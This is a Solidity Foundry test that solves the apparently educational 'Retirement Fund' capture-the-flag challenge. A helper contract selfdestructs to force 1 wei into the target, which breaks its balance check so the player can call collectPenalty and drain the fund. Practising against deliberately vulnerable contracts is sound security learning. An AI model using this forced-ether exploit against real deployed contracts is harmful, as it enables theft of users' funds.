// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "forge-std/Test.sol";
import "../src/retirementFund.sol";

contract destroy {
    constructor() payable { }
    function self_destroy(address victim) external {
        selfdestruct(payable(victim));
    }
}
contract retirementFundTest is Test {
    RetirementFundChallenge target;
    address player = vm.addr(1);

    function setUp() public {
        target = new RetirementFundChallenge{value: 1 ether}(player);
        vm.label(address(target), "Challenge");
        vm.label(player, "player");
        vm.deal(player, 0.01 ether);

    }

    function testFund() public {  
            
        vm.startPrank(player);

        //address(target).call{value: 0.01 ether}('');  
        destroy d = new destroy{value: 1}();
        d.self_destroy(address(target));
        target.collectPenalty();

        assertTrue(target.isComplete());
    }

}
